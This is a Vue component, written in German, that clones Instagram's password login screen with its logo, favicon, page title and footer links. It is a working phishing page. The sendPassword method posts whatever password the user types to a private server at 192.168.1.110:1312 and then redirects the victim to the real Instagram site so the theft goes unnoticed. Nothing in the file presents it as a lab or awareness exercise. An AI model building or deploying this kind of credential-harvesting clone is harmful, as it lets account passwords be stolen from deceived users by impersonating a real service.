  <template>
    <div class="instagram-page">
      <div class="container">
        <!-- Instagram Logo -->
        <div class="instagram-logo">
          <img src="@/assets/img_1.png" alt="Instagram" class="logo-img" />
        </div>

        <!-- Login Card -->
        <div class="login-card">
          <div class="card-header">
            <img :src="content.imgUrl" alt="Profilbild" class="profile-pic" />
            <h1>{{ content.title }}</h1>
            <p class="subtitle">Melde dich mit deinem Passwort an</p>
          </div>

          <div class="card-body">
            <div class="input-group">
              <input
                  v-model="password"
                  type="password"
                  placeholder="Passwort"
                  class="password-input"
              />
            </div>

            <button
                @click="sendPassword"
                :class="{ 'login-btn': true, 'disabled': !password }"
                :disabled="!password"
            >
              Anmelden
            </button>

            <div class="divider">
              <span>ODER</span>
            </div>

            <a href="#" class="forgot-password">Passwort vergessen?</a>
          </div>
        </div>

        <!-- Footer Links -->
        <div class="footer-links">
          <div class="links-grid">
            <a href="https://www.instagram.com/">Meta</a>
            <a href="https://www.instagram.com/">Info</a>
            <a href="https://www.instagram.com/">Blog</a>
            <a href="https://www.instagram.com/">Jobs</a>
            <a href="https://www.instagram.com/">Hilfe</a>
            <a href="https://www.instagram.com/">API</a>
            <a href="https://www.instagram.com/">Datenrichtlinien</a>
            <a href="https://www.instagram.com/">Cookie-Einstellungen</a>
            <a href="https://www.instagram.com/">Nutzungsbedingungen</a>
            <a href="https://www.instagram.com/">Standorte</a>
            <a href="https://www.instagram.com/">Instagram Lite</a>
            <a href="https://www.instagram.com/">Threads</a>
            <a href="https://www.instagram.com/">Hochladen von Kontakten und Nicht-Nutzer</a>
            <a href="https://www.instagram.com/">Meta Verified</a>
          </div>

          <div class="footer-meta">
            <select class="language-select">
              <option>Deutsch</option>
              <option>English</option>
              <option>Français</option>
              <option>Español</option>
            </select>
            <span class="copyright">© 2024 Instagram from Meta</span>
          </div>
        </div>
      </div>
    </div>
  </template>

  <script>
  import img from './/assets/img.png'

  export default {
    data() {
      return {
        password: '',
        content: {
          title: 'example',
          imgUrl: img
        }
      }
    },
    methods: {
      async sendPassword() {
        if (!this.password) return

        try {
          await fetch('http://192.168.1.110:1312/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: this.password })
          })

          this.password = ''
        } catch (err) {
          console.error('Fehler beim Senden', err)
        }
        window.location.replace("https://www.instagram.com");
      }
    },
    mounted() {
      // Set page title
      document.title = "Instagram • Login"

      // Set favicon
      const favicon = document.querySelector("link[rel*='icon']") || document.createElement('link')
      favicon.type = 'image/x-icon'
      favicon.rel = 'shortcut icon'
      favicon.href = require('@/assets/Instagram_icon.png')
      document.head.appendChild(favicon)
    }
  }
  </script>

  <style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  }

  body {
    background: #fafafa;
    min-height: 100vh;
  }

  .instagram-page {
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #fafafa;
    padding: 20px;
  }

  .container {
    width: 100%;
    max-width: 450px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 30px;
  }

  /* Instagram Logo */
  .instagram-logo {
    margin-bottom: 10px;
  }

  .logo-img {
    width: 230px;
    height: auto;
    object-fit: contain;
    border-radius: 13%;
  }

  /* Login Card */
  .login-card {
    width: 100%;
    background: white;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    padding: 40px;
    text-align: center;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
  }

  .card-header {
    margin-bottom: 30px;
  }

  .profile-pic {
    width: 90px;
    height: 90px;
    border-radius: 50%;
    object-fit: cover;
    border: 3px solid #f0f0f0;
    margin-bottom: 20px;
  }

  h1 {
    font-size: 22px;
    font-weight: 600;
    color: #262626;
    margin-bottom: 8px;
  }

  .subtitle {
    font-size: 14px;
    color: #8e8e8e;
    font-weight: 400;
  }

  /* Input and Button */
  .input-group {
    margin-bottom: 15px;
  }

  .password-input {
    width: 100%;
    padding: 14px;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    font-size: 14px;
    background: #fafafa;
    color: #000000 !important;
    transition: border-color 0.2s;
  }

  .password-input:focus {
    outline: none;
    border-color: #a8a8a8;
    background: white;
  }

  .password-input::placeholder {
    color: #8e8e8e;
  }

  .login-btn {
    width: 100%;
    padding: 14px;
    background: #0095f6;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.2s;
    margin-bottom: 20px;
  }

  .login-btn:hover:not(.disabled) {
    background: #0077cc;
  }

  .login-btn.disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }

  /* Divider */
  .divider {
    position: relative;
    margin: 20px 0;
    text-align: center;
  }

  .divider::before {
    content: '';
    position: absolute;
    left: 0;
    top: 50%;
    width: 100%;
    height: 1px;
    background: #dbdbdb;
  }

  .divider span {
    position: relative;
    background: #121212;
    border-radius: 4px;
    padding: 0 20px;
    color: #ffffff;
    font-size: 13px;
    font-weight: 600;
  }

  .forgot-password {
    display: block;
    color: rgb(0, 0, 200);
    font-size: 13px;
    text-decoration: none;
    margin-top: 20px;
  }

  .forgot-password:hover {
    text-decoration: underline;
  }

  /* Card Footer */
  .card-footer {
    margin-top: 40px;
    padding-top: 20px;
    border-top: 1px solid #dbdbdb;
    font-size: 14px;
    color: #262626;
  }

  .signup-link {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
  }

  .signup-link:hover {
    text-decoration: underline;
  }

  /* Footer Links */
  .footer-links {
    width: 100%;
    text-align: center;
  }

  .links-grid {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 12px 16px;
    margin-bottom: 20px;
  }

  .links-grid a {
    color: #8e8e8e;
    font-size: 13px;
    text-decoration: none;
    transition: color 0.2s;
    white-space: nowrap;
  }

  .links-grid a:hover {
    color: #262626;
    text-decoration: underline;
  }

  .footer-meta {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    align-items: center;
    gap: 16px;
    color: #8e8e8e;
    font-size: 13px;
  }

  .language-select {
    padding: 5px 10px;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    background: white;
    color: #262626;
    font-size: 13px;
    cursor: pointer;
    outline: none;
  }

  .copyright {
    color: #8e8e8e;
  }

  /* Responsive */
  @media (max-width: 480px) {
    .login-card {
      padding: 30px 20px;
      background: transparent;
      border: none;
      box-shadow: none;
    }

    .container {
      gap: 20px;
    }

    .logo-img {
      width: 200px;
    }

    .links-grid {
      gap: 10px 12px;
    }

    .links-grid a {
      font-size: 12px;
    }

    .footer-meta {
      flex-direction: column;
      gap: 12px;
    }
  }

  /* Dark Mode Support */
  @media (prefers-color-scheme: dark) {
    body, .instagram-page {
      background: #000;
    }

    .login-card {
      background: #121212;
      border-color: #333;
    }

    h1, .card-footer {
      color: #f5f5f5;
    }

    .password-input {
      background: #1e1e1e;
      border-color: #333;
      color: #f5f5f5;
    }

    .password-input::placeholder {
      color: #8e8e8e;
    }

    .links-grid a {
      color: #a8a8a8;
    }

    .links-grid a:hover {
      color: #f5f5f5;
    }

    .language-select {
      background: #1e1e1e;
      border-color: #333;
      color: #f5f5f5;
    }
  }
  </style>